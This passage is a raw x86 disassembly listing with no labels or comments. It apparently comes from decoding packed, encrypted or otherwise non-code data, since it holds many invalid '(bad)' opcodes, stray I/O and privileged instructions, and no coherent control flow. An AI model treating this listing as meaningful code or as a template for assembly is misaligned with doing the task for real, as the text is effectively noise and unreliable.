  413686:	xchg   DWORD PTR [ebx-0x6761c925],ebx
  41368c:	xchg   esi,eax
  41368d:	ficom  DWORD PTR [eax+0x5e]
  413690:	mov    ch,BYTE PTR [edi+0x4d1d5f81]
  413696:	icebp  
  413697:	cmp    BYTE PTR [ebp-0x31535445],dl
  41369d:	adc    BYTE PTR ds:0xfac9855a,bl
  4136a3:	dec    esp
  4136a4:	fwait
  4136a5:	push   es
  4136a6:	xchg   DWORD PTR [ebx+0x36],edx
  4136a9:	xchg   ebp,eax
  4136aa:	xlat   BYTE PTR ds:[ebx]
  4136ab:	int    0x86
  4136ad:	(bad)  
  4136ae:	jmp    0x49a1:0x187b60ea
  4136b5:	sbb    eax,0x6df679b6
  4136ba:	lods   eax,DWORD PTR ds:[esi]
  4136bb:	pop    ebp
  4136bc:	mov    ecx,0xff1dc9d9
  4136c1:	mov    ch,0xd9
  4136c3:	sub    DWORD PTR [ecx-0x4ec505de],esi
  4136c9:	fisubr DWORD PTR [esi]
  4136cb:	dec    esi
  4136cc:	xor    al,0x9a
  4136ce:	(bad)  [esi+0x73]
  4136d1:	xchg   ebp,eax
  4136d2:	icebp  
  4136d3:	add    ah,BYTE PTR [ebp-0xa]
  4136d6:	stos   DWORD PTR es:[edi],eax
  4136d7:	push   eax
  4136d8:	push   0x8137f871
  4136dd:	mov    ds:0xbcc12b8a,al
  4136e2:	and    DWORD PTR [eax-0x63cbfb37],edi
  4136e8:	add    cl,BYTE PTR [esi-0x40]
  4136eb:	mov    bh,0xf1
  4136ed:	mov    esi,0x1542139f
  4136f2:	(bad)  
  4136f3:	inc    ecx
  4136f4:	and    al,0x8c
  4136f6:	popf   
  4136f7:	push   esi
  4136f8:	mov    cl,BYTE PTR [edi-0x18ca67a]
  4136fe:	rcr    DWORD PTR [edx*4+0x32ae5e52],1
  413705:	dec    edi
  413706:	cwde   
  413707:	and    edx,edx
  413709:	das    
  41370a:	popa   
  41370b:	adc    BYTE PTR [esi],bl
  41370d:	mov    bl,0x70
  41370f:	cmp    eax,0xd0e3a9ad
  413714:	cs xchg edi,eax
  413716:	mov    ch,0x3a
  413718:	fsub   QWORD PTR [esi+0x73209a72]
  41371e:	ds (bad) 
  413721:	mov    cl,0xc2
  413723:	cmp    eax,0xd44ecbb5
  413728:	push   edi
  413729:	gs ins DWORD PTR es:[edi],dx
  41372b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41372c:	cs push edi
  41372e:	scas   eax,DWORD PTR es:[edi]
  41372f:	je     0x413721
  413731:	xchg   BYTE PTR [ebp-0x5b],al
  413734:	inc    edx
  413735:	scas   al,BYTE PTR es:[di]
  413737:	jns    0x4136c0
  413739:	pop    ss
  41373a:	(bad)  
  41373b:	mov    eax,ds:0xb88e5cf
  413740:	xchg   esi,eax
  413741:	xchg   esp,eax
  413742:	jns    0x41379d
  413744:	(bad)  
  413746:	lods   eax,DWORD PTR ds:[esi]
  413747:	test   eax,0xb28e0b29
  41374c:	adc    BYTE PTR [edx+ecx*8+0x26],0xb7
  413751:	test   BYTE PTR [eax+0xc],ch
  413754:	sbb    al,0x5f
  413756:	sti    
  413757:	xchg   DWORD PTR [edi-0x10426865],edx
  41375d:	sbb    DWORD PTR [ebx+0x516a8653],0xffffffaf
  413764:	popa   
  413765:	(bad)  
  413766:	fld    DWORD PTR [esp+eax*1-0x3e946213]
  41376d:	mov    al,0xc2
  41376f:	sub    DWORD PTR [ecx],0x77
  413772:	xor    al,0xf4
  413774:	adc    eax,esi
  413776:	pop    edx
  413777:	sbb    bh,dh
  413779:	push   cs
  41377a:	stc    
  41377b:	cmc    
  41377c:	mov    ebp,0xb36d22c6
  413781:	pop    ss
  413782:	ds jge 0x4137a0
  413785:	add    DWORD PTR [edi+0x69bf0718],ecx
  41378b:	cmp    eax,DWORD PTR [eax]
  41378d:	inc    ebp
  41378e:	or     edi,edx
  413790:	xchg   esp,eax
  413791:	pop    edi
  413792:	push   edi
  413793:	cmp    bh,al
  413795:	mov    edx,0x2569956
  41379a:	or     eax,0xe88901bc
  41379f:	and    eax,0x452b409f
  4137a4:	sahf   
  4137a5:	stos   DWORD PTR es:[edi],eax
  4137a6:	lods   al,BYTE PTR ds:[esi]
  4137a7:	cmp    al,0x5
  4137a9:	jae    0x4137a5
  4137ab:	mov    ebp,?
  4137ad:	and    dl,ah
  4137af:	cmp    DWORD PTR [ebx],0xffffff8a
  4137b2:	adc    dl,BYTE PTR [esi]
  4137b4:	mov    ebp,0x7e3ec140
  4137b9:	scas   eax,DWORD PTR es:[edi]
  4137ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137bb:	cmp    ah,ch
  4137bd:	xchg   esi,eax
  4137be:	dec    edx
  4137bf:	pop    ss
  4137c0:	arpl   ax,si
  4137c2:	mov    esi,ebx
  4137c4:	scas   al,BYTE PTR es:[edi]
  4137c5:	jecxz  0x413816
  4137c7:	xchg   ebx,eax
  4137c8:	push   ebx
  4137c9:	dec    esp
  4137ca:	sbb    BYTE PTR ds:0x601d1e7d,cl
  4137d0:	mov    al,ds:0x617b0cfb
  4137d5:	aam    0xff
  4137d7:	(bad)  
  4137d8:	outs   dx,DWORD PTR ds:[esi]
  4137d9:	xchg   ebp,eax
  4137da:	mov    eax,0x1af9effc
  4137df:	sbb    BYTE PTR [esi+0x42a1598e],0x66
  4137e6:	bound  esi,QWORD PTR [ebx-0x6a24e6b1]
  4137ec:	out    dx,al
  4137ed:	mov    ecx,0x4324e269
  4137f2:	jbe    0x4137d4
  4137f4:	add    DWORD PTR [esi+0x60],eax
  4137f7:	adc    ebp,DWORD PTR [ecx+0x5218d5fa]
  4137fd:	shl    dh,1
  4137ff:	scas   eax,DWORD PTR es:[edi]
  413800:	jge    0x41382d
  413802:	retf   0xb711
  413805:	inc    eax
  413806:	popf   
  413807:	dec    esi
  413808:	or     BYTE PTR [edx-0x652601a2],ah
  41380e:	ret    
  41380f:	inc    ebx
  413810:	sub    eax,0xc5122bc2
  413815:	adc    al,0x4b
  413817:	and    edi,esp
  413819:	daa    
  41381a:	out    dx,al
  41381b:	out    0x16,eax
  41381d:	sub    bl,BYTE PTR [eax]
  41381f:	in     eax,dx
  413820:	ror    esp,0xe7
  413823:	loop   0x4137e0
  413825:	cli    
  413826:	mov    ds:0x3caa334,eax
  41382b:	pop    ebx
  41382c:	sub    bl,bh
  41382e:	xchg   ecx,eax
  41382f:	xchg   cl,cl
  413831:	jl     0x413884
  413833:	dec    ecx
  413834:	push   es
  413835:	jle    0x41385b
  413837:	or     DWORD PTR [ebp+0x1e6a0a3b],esi
  41383d:	push   0xbc41e764
  413842:	lock nop
  413844:	pop    ebx
  413845:	pop    ds
  413846:	cli    
  413847:	int3   
  413848:	pusha  
  413849:	(bad)  
  41384a:	mov    dh,0x1b
  41384c:	push   0x4
  41384e:	or     ah,BYTE PTR [edx-0x74]
  413851:	cmp    al,dh
  413853:	loop   0x41387e
  413855:	add    DWORD PTR [esp+edx*8-0x12500f84],esp
  41385c:	adc    BYTE PTR [edx+eax*4-0x900acb5],0xae
  413864:	push   ebx
  413865:	pop    ebp
  413866:	xor    ah,bh
  413868:	inc    ebx
  413869:	jbe    0x41387b
  41386b:	jnp    0x41388f
  41386d:	jae    0x4138dd
  41386f:	mov    al,BYTE PTR [edx+esi*4+0x5e]
  413873:	push   ss
  413874:	aaa    
  413875:	sub    BYTE PTR [edi-0x7957e4e1],0xa5
  41387c:	pop    ebp
  41387d:	fwait
  41387e:	pop    eax
  41387f:	imul   edi,ebx,0x39312c0c
  413885:	es test ecx,ebp
  413888:	ins    DWORD PTR es:[edi],dx
  413889:	leave  
  41388a:	or     bl,BYTE PTR [eax+0x4a7840d2]
  413890:	fwait
  413891:	gs arpl cx,cx
  413894:	and    cl,BYTE PTR [ebx]
  413896:	cmp    esp,DWORD PTR [esi]
  413898:	cmp    DWORD PTR [eax],ecx
  41389a:	loop   0x41387c
  41389c:	cmovo  edi,DWORD PTR [ebx]
  41389f:	mov    bl,0x46
  4138a1:	div    ecx
  4138a3:	frstor [ebx-0x6e]
  4138a6:	aaa    
  4138a7:	inc    ecx
  4138a8:	sub    bh,bh
  4138aa:	pop    ebx
  4138ab:	sub    al,BYTE PTR [ebx]
  4138ad:	fbld   TBYTE PTR [ecx+0x1360aba3]
  4138b3:	leave  
  4138b4:	retf   
  4138b5:	or     ah,BYTE PTR [edx+esi*4-0x6d2bdda9]
  4138bc:	mov    DWORD PTR [edi+0x24],ebp
  4138bf:	jge    0x4138ab
  4138c1:	fist   DWORD PTR [ecx+0x9]
  4138c4:	imul   ecx,DWORD PTR [ebx+0x27],0xf9edfc90
  4138cb:	(bad)  
  4138cc:	fnstenv [esi]
  4138ce:	pop    es
  4138cf:	aam    0xda
  4138d1:	adc    bh,dl
  4138d3:	mov    ch,0x11
  4138d5:	gs lahf 
  4138d7:	jg     0x4138c2
  4138d9:	mov    ecx,0x84889e31
  4138de:	hlt    
  4138df:	or     al,0xd0
  4138e1:	inc    esp
  4138e2:	add    al,0xf3
  4138e4:	xor    cl,BYTE PTR [esi+0x5d]
  4138e7:	add    eax,0x9e2f310f
  4138ec:	pop    eax
  4138ed:	retf   
  4138ee:	push   es
  4138ef:	mov    ah,0x11
  4138f1:	into   
  4138f2:	imul   edx,DWORD PTR [esi],0x3fcd9a15
  4138f8:	test   al,0x94
  4138fa:	adc    DWORD PTR [ebp-0x1e],0xffffffc3
  4138fe:	fcomp  QWORD PTR [esp+ebx*8]
  413901:	cld    
  413902:	xchg   esi,eax
  413903:	rol    BYTE PTR [ecx-0x76],0xef
  413907:	shl    DWORD PTR [ecx+eiz*8-0x1f],0x9f
  41390c:	add    BYTE PTR [eax],ah
  41390e:	sub    eax,0x7309cb1c
  413913:	add    BYTE PTR [eax],bh
  413915:	pop    edx
  413916:	or     DWORD PTR [eax+0x37],esi
  413919:	mov    ebx,DWORD PTR [ecx-0x41]
  41391c:	cmp    eax,0x9c3bcf67
  413921:	rol    BYTE PTR [ebp+0x136c25b0],1
  413927:	jge    0x4138f5
  413929:	test   DWORD PTR [ebp-0x1f12586d],ecx
  41392f:	sub    bh,BYTE PTR ds:0xbb63f993
  413935:	mov    ds:0x99d83379,al
  41393a:	and    esi,DWORD PTR [eax]
  41393c:	xchg   DWORD PTR [edi],ecx
  41393e:	inc    edx
  41393f:	inc    esi
  413940:	jmp    0x2fdbe82d
  413945:	(bad)  
  413946:	push   0xfffffff8
  413948:	fdiv   DWORD PTR [edi-0x2cfcfb4b]
  41394e:	mov    edx,0x37631da3
  413953:	dec    esi
  413954:	xchg   ecx,eax
  413955:	into   
  413956:	sahf   
  413957:	and    al,0xb9
  413959:	cdq    
  41395a:	mov    bl,0x89
  41395c:	fbld   TBYTE PTR [esi+0x539bcced]
  413962:	dec    esi
  413963:	fst    DWORD PTR [esi-0x43]
  413966:	imul   esp,DWORD PTR [edx],0xffffffc5
  413969:	jbe    0x413904
  41396b:	loop   0x41391e
  41396d:	dec    edi
  41396e:	repz or DWORD PTR ds:0x4ea2bfc7,0x54
  413976:	mov    ?,WORD PTR [edi+0x24f5f2a3]
  41397c:	das    
  41397d:	sub    al,BYTE PTR [esi+0x3ec04050]
  413983:	ins    DWORD PTR es:[edi],dx
  413984:	push   es
  413985:	mov    bh,0xf2
  413987:	pop    ecx
  413988:	arpl   WORD PTR [esi-0x455dee34],cx
  41398e:	stc    
  41398f:	fdivr  QWORD PTR [edi-0x57abfe2d]
  413995:	cmp    al,ah
  413997:	arpl   WORD PTR [eax+0x4],bp
  41399a:	push   ss
  41399b:	sub    al,0x57
  41399d:	mov    dh,0xd6
  41399f:	jecxz  0x41395d
  4139a1:	jb     0x413a16
  4139a3:	pop    edi
  4139a4:	pop    edx
  4139a5:	and    esi,DWORD PTR es:0x5a96529f
  4139ac:	xchg   esi,eax
  4139ad:	stc    
  4139ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139af:	mov    ah,0x20
  4139b1:	push   esp
  4139b2:	xor    DWORD PTR [edi+ecx*4+0x4f],edi
  4139b6:	dec    edi
  4139b7:	dec    ebp
  4139b8:	adc    BYTE PTR [ebp-0x14],bl
  4139bb:	push   ecx
  4139bc:	adc    DWORD PTR [ebx+0x1d],edx
  4139bf:	dec    ecx
  4139c0:	iret   
  4139c1:	xor    eax,0xcb77d8a8
  4139c6:	mov    edx,0x24298e89
  4139cb:	icebp  
  4139cc:	cmp    BYTE PTR ds:0xa5b4164c,ch
  4139d2:	inc    edi
  4139d3:	inc    edx
  4139d4:	pop    ecx
  4139d5:	test   eax,0xa6f01fa4
  4139da:	cmp    edi,esp
  4139dc:	inc    edx
  4139dd:	and    BYTE PTR [edx-0x44],dh
  4139e0:	fmul   QWORD PTR [ecx]
  4139e2:	dec    ebp
  4139e3:	cmp    bl,BYTE PTR [edx+0x33d2e9fe]
  4139e9:	xchg   ecx,eax
  4139ea:	xor    al,ah
  4139ec:	push   0xffffff9f
  4139ee:	sub    BYTE PTR [edx+0x75089225],bl
  4139f4:	dec    edx
  4139f5:	xchg   ecx,eax
  4139f6:	lock sti 
  4139f8:	dec    ebx
  4139f9:	mov    al,BYTE PTR [edx-0x3]
  4139fc:	inc    edx
  4139fd:	retf   0xa00
  413a00:	and    al,BYTE PTR [esi+ebp*2-0x312fb1e7]
  413a07:	gs dec esp
  413a09:	pop    ebx
  413a0a:	lahf   
  413a0b:	stc    
  413a0c:	xor    al,0x91
  413a0e:	pop    eax
  413a0f:	jecxz  0x4139a8
  413a11:	js     0x413a0b
  413a13:	int    0xc9
  413a15:	pop    ss
  413a16:	fiadd  DWORD PTR [esi]
  413a18:	xor    eax,0xb8f9f94e
  413a1d:	call   0x7e337ff9
  413a22:	sar    DWORD PTR [ecx],1
  413a24:	loopne 0x413a7b
  413a26:	and    edx,ebx
  413a28:	(bad)  
  413a29:	retf   0x7ff6
  413a2c:	popa   
  413a2d:	pop    ss
  413a2e:	mov    bh,0xe0
  413a30:	dec    ebp
  413a31:	mov    eax,ds:0xaff0be6b
  413a36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a37:	pminsw mm2,QWORD PTR [edx]
  413a3a:	mov    esi,0x5b287b7c
  413a3f:	cld    
  413a40:	popa   
  413a41:	lahf   
  413a42:	cld    
  413a43:	pusha  
  413a44:	pop    esi
  413a45:	mov    al,ds:0xc2cabc2c
  413a4a:	mov    ebx,0xc12c0a9a
  413a4f:	mov    DWORD PTR [esi-0x6c3e7eae],edx
  413a55:	sub    ah,al
  413a57:	push   ss
  413a58:	leave  
  413a59:	fcom   DWORD PTR gs:[ebp+0x24]
  413a5d:	hlt    
  413a5e:	jae    0x413aa6
  413a60:	jecxz  0x413a30
  413a62:	shr    BYTE PTR [edx+0x48e2387d],cl
  413a68:	inc    ebp
  413a69:	push   edi
  413a6a:	rol    ebp,cl
  413a6c:	arpl   WORD PTR [eax],sp
  413a6e:	push   cs
  413a6f:	fidivr WORD PTR ds:0xf760b24f
  413a75:	add    BYTE PTR [ecx+0x7],0xb8
  413a79:	cmp    bl,cl
  413a7b:	push   ebp
  413a7c:	test   al,0xa6
  413a7e:	test   DWORD PTR [edx],edx
  413a80:	aam    0x39
  413a82:	imul   esp,DWORD PTR [ebp-0x3f72e502],0x34
  413a89:	addr16 cmp al,0xa8
  413a8c:	add    eax,ebp
  413a8e:	dec    DWORD PTR [ebp+0x5768e83c]
  413a94:	fxtract 
  413a96:	sub    BYTE PTR [ebp-0x397b61d9],ch
  413a9c:	xchg   BYTE PTR [ebx-0x3b],al
  413a9f:	ret    0x1f73
  413aa2:	cmp    BYTE PTR [ebp-0x1],dl
  413aa5:	xor    al,0x1a
  413aa7:	mov    al,ds:0xf4b7435c
  413aac:	dec    ebx
  413aad:	mov    edx,ebx
  413aaf:	adc    eax,ecx
  413ab1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ab2:	mov    bl,0xd
  413ab4:	fisttp QWORD PTR [ebx]
  413ab6:	sub    BYTE PTR [ebx+0x68],cl
  413ab9:	cmp    eax,0x4ead412
  413abe:	mov    eax,0x5a6fa082
  413ac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ac4:	mov    ds,WORD PTR [edx+eiz*8]
  413ac7:	gs cmc 
  413ac9:	mov    edx,0x2da0f207
  413ace:	bound  esi,QWORD PTR [esi]
  413ad0:	outs   dx,BYTE PTR ds:[esi]
  413ad1:	into   
  413ad2:	lods   eax,DWORD PTR ds:[esi]
  413ad3:	jb     0x413aec
  413ad5:	xchg   ecx,eax
  413ad6:	aad    0x55
  413ad8:	mov    dl,dh
  413ada:	sbb    BYTE PTR [edx],cl
  413adc:	aam    0x2d
  413ade:	ret    
  413adf:	(bad)  
  413ae1:	cmc    
  413ae2:	cwde   
  413ae3:	sbb    bl,al
  413ae5:	mov    DWORD PTR [esi+0x68],eax
  413ae8:	dec    esp
  413ae9:	test   eax,0xa743a903
  413aee:	ret    
  413aef:	shl    ecx,cl
  413af1:	outs   dx,BYTE PTR ds:[esi]
  413af2:	and    dh,BYTE PTR [eax+0x6c0726fa]
  413af8:	dec    DWORD PTR [eax+0x44b7707f]
  413afe:	and    dh,BYTE PTR [edi]
  413b00:	adc    DWORD PTR [ecx],edx
  413b02:	sti    
  413b03:	shr    BYTE PTR [ecx],0x1c
  413b06:	push   ecx
  413b07:	push   esp
  413b08:	jns    0x413af5
  413b0a:	fmul   DWORD PTR [edx-0x573223ef]
  413b10:	mov    bh,BYTE PTR [ebp-0x25d2b555]
  413b16:	stc    
  413b17:	push   ebp
  413b18:	add    BYTE PTR [edi+edx*1+0x2d7f98af],cl
  413b1f:	fisubr DWORD PTR [ebp+0x66]
  413b22:	ret    
  413b23:	call   FWORD PTR [ebp-0x219bece1]
  413b29:	pushf  
  413b2a:	mov    BYTE PTR ds:0xcb35aec6,al
  413b30:	mov    ah,0x6c
  413b32:	addr16 and eax,0xd5adb723
  413b38:	clc    
  413b39:	jae    0x413b5f
  413b3b:	cmp    eax,0x9e66ea06
  413b40:	out    dx,eax
  413b41:	jp     0x413b41
  413b43:	jnp    0x413bb9
  413b45:	enter  0x7490,0xa8
  413b49:	nop
  413b4a:	mov    edi,0xc428ef18
  413b4f:	and    ch,BYTE PTR [ebx]
  413b51:	xchg   ebp,eax
  413b52:	lds    ebp,FWORD PTR [ecx+0x71]
  413b55:	mov    cl,0x45
  413b57:	sub    BYTE PTR [ebx-0x7791f462],dh
  413b5d:	sbb    edi,DWORD PTR [esi+edx*4]
  413b60:	pushf  
  413b61:	mov    cl,0xc4
  413b63:	lock out 0x25,al
  413b66:	mov    bl,0x92
  413b68:	scas   al,BYTE PTR es:[edi]
  413b69:	pushf  
  413b6a:	add    BYTE PTR [esi],bh
  413b6c:	scas   al,BYTE PTR es:[edi]
  413b6d:	ficom  WORD PTR [edx-0x44]
  413b70:	pop    ss
  413b71:	inc    ebx
  413b72:	adc    al,0x57
  413b74:	mov    dh,0x57
  413b76:	xor    al,ch
  413b78:	lea    edi,[ecx]
  413b7a:	sub    edx,eax
  413b7c:	pop    es
  413b7d:	fsubr  st(5),st
  413b7f:	mov    ds:0xf8bb303f,eax
  413b84:	gs inc ecx
  413b86:	dec    edx
  413b87:	mov    eax,ds:0x4aacd12a
  413b8c:	pop    es
  413b8d:	jno    0x413b67
  413b8f:	xor    BYTE PTR [eax+0x1a23c870],bh
  413b95:	fist   WORD PTR [esi+0x43]
  413b98:	aad    0xdb
  413b9a:	(bad)  
  413b9b:	repz clc 
  413b9d:	je     0x413b3a
  413b9f:	aam    0x45
  413ba1:	jns    0x413bf9
  413ba3:	div    ebx
  413ba5:	push   esi
  413ba6:	loopne 0x413b62
  413ba8:	jae    0x413b66
  413baa:	lods   al,BYTE PTR ds:[esi]
  413bab:	aas    
  413bac:	push   0x56
  413bae:	sub    edi,esp
  413bb0:	xchg   ecx,eax
  413bb1:	hlt    
  413bb2:	bound  edi,QWORD PTR [ecx-0x1a]
  413bb5:	cli    
  413bb6:	in     eax,0xef
  413bb8:	fimul  WORD PTR [ebp-0x2d9c34ea]
  413bbe:	repnz mov ch,0x97
  413bc1:	js     0x413b58
  413bc3:	jo     0x413b96
  413bc5:	ins    BYTE PTR es:[edi],dx
  413bc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bc7:	js     0x413bcd
  413bc9:	push   edx
  413bca:	ins    BYTE PTR es:[edi],dx
  413bcb:	xor    edx,edi
  413bcd:	adc    bh,al
  413bcf:	addr16 out dx,al
  413bd1:	fwait
  413bd2:	out    dx,eax
  413bd3:	ret    0x9671
  413bd6:	add    bh,BYTE PTR [ecx+0x7229eb51]
  413bdc:	loop   0x413bf9
  413bde:	(bad)  
  413bdf:	loope  0x413c0c
  413be1:	imul   ecx
  413be3:	popa   
  413be4:	lds    esp,FWORD PTR [ecx-0x60]
  413be7:	jge    0x413c55
  413be9:	add    BYTE PTR [eax+0x62bc5390],dh
  413bef:	push   ss
  413bf0:	shl    DWORD PTR [edx-0x80],1
  413bf3:	(bad)  
  413bf5:	add    ah,cl
  413bf7:	lahf   
  413bf8:	fbld   TBYTE PTR [edi-0x72f4de00]
  413bfe:	xchg   esi,eax
  413bff:	stos   BYTE PTR es:[edi],al
  413c00:	mov    ecx,0x55ca0c7f
  413c05:	fsubr  DWORD PTR [esi-0x50]
  413c08:	dec    ecx
  413c09:	enter  0x23a5,0x6d
  413c0d:	iret   
  413c0e:	setnp  BYTE PTR [ebx-0x70]
  413c12:	leave  
  413c13:	dec    ebp
  413c14:	ins    BYTE PTR es:[edi],dx
  413c15:	adc    eax,DWORD PTR [ecx+0x7fd887bf]
  413c1b:	adc    eax,0x11ef0981
  413c20:	xor    BYTE PTR [eax],dh
  413c22:	js     0x413c28
  413c24:	xchg   esi,eax
  413c25:	adc    DWORD PTR [ecx],eax
  413c27:	adc    eax,ebp
  413c29:	and    BYTE PTR [esi],ch
  413c2b:	cli    
  413c2c:	or     edx,DWORD PTR [ecx+ebp*4]
  413c2f:	js     0x413c68
  413c31:	mov    ch,0x3c
  413c33:	jmp    DWORD PTR [eax]
  413c35:	and    al,BYTE PTR [edx-0x61]
  413c38:	popa   
  413c39:	pop    eax
  413c3a:	loope  0x413c2d
  413c3c:	or     dl,BYTE PTR [ebx+0x31]
  413c3f:	mov    dl,BYTE PTR [ebp-0x3ca0ed55]
  413c45:	push   esp
  413c46:	cli    
  413c47:	mov    ch,BYTE PTR [edx]
  413c49:	mov    ecx,0x664c9c99
  413c4e:	inc    ebp
  413c4f:	(bad)  
  413c50:	jmp    esp
  413c52:	fisub  WORD PTR [eax+0xcebeecf]
  413c58:	shl    DWORD PTR [ecx-0x76d3e2b9],1
  413c5e:	xor    al,ah
  413c60:	jp     0x413be4
  413c62:	pop    edi
  413c63:	int    0x22
  413c65:	dec    ecx
  413c66:	cmp    eax,0xaccb93ed
  413c6b:	push   ss
  413c6c:	iret   
  413c6d:	dec    edi
  413c6e:	das    
  413c6f:	ja     0x413caa
  413c71:	mov    ah,0xc8
  413c73:	dec    ebx
  413c74:	mov    eax,ds:0xf4081264
  413c79:	popf   
  413c7a:	aaa    
  413c7b:	sub    BYTE PTR [esi+0x8a75a19],al
  413c81:	push   edi
  413c82:	lea    ebx,[eax+0x7f]
  413c85:	jne    0x413cc9
  413c87:	out    0xc3,eax
  413c89:	push   ecx
  413c8a:	sbb    BYTE PTR [ebp-0x2e],cl
  413c8d:	cwde   
  413c8e:	xor    BYTE PTR [edx+0x6df00f18],al
  413c94:	cmp    eax,0x3a3cba82
  413c99:	pop    edx
  413c9a:	ret    
  413c9b:	and    al,BYTE PTR [ebp-0x6a]
  413c9e:	loop   0x413cab
  413ca0:	or     bl,BYTE PTR [ebx-0x57]
  413ca3:	aam    0x3d
  413ca5:	jnp    0x413cec
  413ca7:	sub    BYTE PTR [ebx-0x5146e96a],al
  413cad:	sbb    eax,0x6c3d0c26
  413cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cb3:	iret   
  413cb4:	sbb    eax,DWORD PTR [edx+0x34]
  413cb7:	out    dx,eax
  413cb8:	stos   BYTE PTR es:[edi],al
  413cb9:	inc    esi
  413cba:	rcr    esi,cl
  413cbc:	mov    bl,0xf7
  413cbe:	nop
  413cbf:	xchg   ecx,eax
  413cc0:	xchg   edx,eax
  413cc1:	ss sbb cl,ah
  413cc4:	loopne 0x413c91
  413cc6:	or     ah,0xc9
  413cc9:	mov    ebx,0x3c50c912
  413cce:	loopne 0x413c92
  413cd0:	inc    ebp
  413cd1:	mov    ebp,0x3582d3a5
  413cd6:	imul   BYTE PTR [esi]
  413cd8:	pop    edi
  413cd9:	or     DWORD PTR [eax+0xc],esp
  413cdc:	enter  0x3579,0x3c
  413ce0:	cli    
  413ce1:	into   
  413ce2:	cmp    ecx,DWORD PTR [eax+0x4f]
  413ce5:	ficom  DWORD PTR [edi-0x6dfb8fcf]
  413ceb:	jno    0x413d61
  413ced:	and    BYTE PTR [ecx],bl
  413cef:	ss adc eax,0xd606c3dd
  413cf5:	adc    eax,0xc88ccbb2
  413cfa:	xor    esp,DWORD PTR [edi]
  413cfc:	and    al,0xd4
  413cfe:	push   ss
  413cff:	adc    DWORD PTR [ecx+0x41b917a9],ebp
  413d05:	fwait
  413d06:	out    0xac,eax
  413d08:	cdq    
  413d09:	push   esp
  413d0a:	or     edx,eax
  413d0c:	sbb    ecx,DWORD PTR [esi+0x71]
  413d0f:	push   cs
  413d10:	xchg   ebp,eax
  413d11:	sbb    bh,BYTE PTR [eax+0x227e7b49]
  413d17:	stc    
  413d18:	add    eax,0x430a924
  413d1d:	sahf   
  413d1e:	sbb    BYTE PTR [edi],0xf5
  413d21:	inc    edx
  413d22:	sub    al,0x2d
  413d24:	inc    ecx
  413d25:	test   eax,0x6979da26
  413d2a:	outs   dx,DWORD PTR ds:[esi]
  413d2b:	cmp    eax,0x1edfee22
  413d30:	xor    DWORD PTR fs:0x97b8164,0x7fee561e
  413d3b:	sub    ebx,DWORD PTR [ebx+0x2e]
  413d3e:	inc    ebx
  413d3f:	xchg   edi,eax
  413d40:	dec    edi
  413d41:	clc    
  413d42:	test   DWORD PTR [ecx+ebp*2-0x9fc8c6],ecx
  413d49:	out    dx,al
  413d4a:	dec    edx
  413d4b:	inc    esi
  413d4c:	push   ebx
  413d4d:	adc    DWORD PTR [ecx-0x26],esi
  413d50:	pushf  
  413d51:	mov    BYTE PTR [ecx+0x33880b4f],bh
  413d57:	mov    ds:0x38e9a282,al
  413d5c:	sub    edi,DWORD PTR [ecx+eiz*2-0x7f]
  413d60:	fdiv   st(5),st
  413d62:	push   ds
  413d63:	inc    esp
  413d64:	les    esp,FWORD PTR [ebp-0x3e]
  413d67:	push   edi
  413d68:	stc    
  413d69:	jo     0x413d3b
  413d6b:	jb     0x413dc7
  413d6d:	push   ebp
  413d6e:	test   BYTE PTR [eax],ch
  413d70:	mov    esp,0x435197ab
  413d75:	test   eax,0xbf76ba8e
  413d7a:	push   esi
  413d7b:	popf   
  413d7c:	fxch   st(3)
  413d7e:	retf   
  413d7f:	inc    ebp
  413d80:	push   edi
  413d81:	imul   eax,DWORD PTR [ebx],0xffffffa2
  413d84:	dec    esp
  413d85:	inc    eax
  413d86:	mov    ebp,esp
  413d88:	int3   
  413d89:	xor    al,BYTE PTR [ebx]
  413d8b:	in     eax,dx
  413d8c:	jecxz  0x413d82
  413d8e:	xchg   edx,eax
  413d8f:	mov    DWORD PTR [esi],edi
  413d91:	sbb    al,0x79
  413d93:	jge    0x413db7
  413d95:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  413d97:	mov    edi,0x69e71dcd
  413d9c:	ins    BYTE PTR es:[edi],dx
  413d9d:	pop    ss
  413d9e:	sahf   
  413d9f:	mov    ds:0x42256b8b,al
  413da4:	rol    bh,1
  413da6:	xchg   ebx,eax
  413da7:	pop    ss
  413da8:	mov    WORD PTR [edi-0x13],es
  413dab:	in     al,0xdf
  413dad:	adc    DWORD PTR [edx+0x6d740cbb],eax
  413db3:	push   cs
  413db4:	mov    ebp,0x25270ac0
  413db9:	sbb    eax,0xfcedd9fa
  413dbe:	lds    ebx,FWORD PTR [eax-0x2b9518eb]
  413dc4:	dec    ecx
  413dc5:	mov    bh,0xa4
  413dc7:	rcr    BYTE PTR ds:0xa0c4fea5,0xe5
  413dce:	sti    
  413dcf:	test   BYTE PTR [ebx+0x45d65b88],al
  413dd5:	test   BYTE PTR [ebx],dl
  413dd7:	xor    BYTE PTR [eax-0x58],bl
  413dda:	pop    edi
  413ddb:	iret   
  413ddc:	bound  ebp,QWORD PTR ss:[ebx+0x4f12669e]
  413de3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413de4:	pop    ds
  413de5:	out    0xd3,eax
  413de7:	mov    bl,0x9e
  413de9:	imul   edx,eax,0x58
  413dec:	data16 mov al,0xef
  413def:	out    dx,al
  413df0:	fistp  DWORD PTR [esi+ebp*4+0x3b]
  413df4:	sbb    al,0xc4
  413df6:	adc    ch,dl
  413df8:	cwde   
  413df9:	rol    BYTE PTR [edi*1-0x24484ac],1
  413e00:	pop    ss
  413e01:	dec    ebp
  413e02:	shr    DWORD PTR [eax],cl
  413e04:	mov    ebx,DWORD PTR [esp+ebp*4]
  413e07:	add    ecx,0x12
  413e0a:	sub    DWORD PTR cs:[ebp+0x24],eax
  413e0e:	fnsave [edi+0x1f]
  413e11:	and    BYTE PTR [eax],cl
  413e13:	push   cs
  413e14:	pop    ds
  413e15:	out    dx,eax
  413e16:	in     al,dx
  413e17:	pop    eax
  413e18:	(bad)  
  413e19:	mov    WORD PTR [eax+0x12ea3254],es
  413e1f:	sbb    ecx,DWORD PTR [esi]
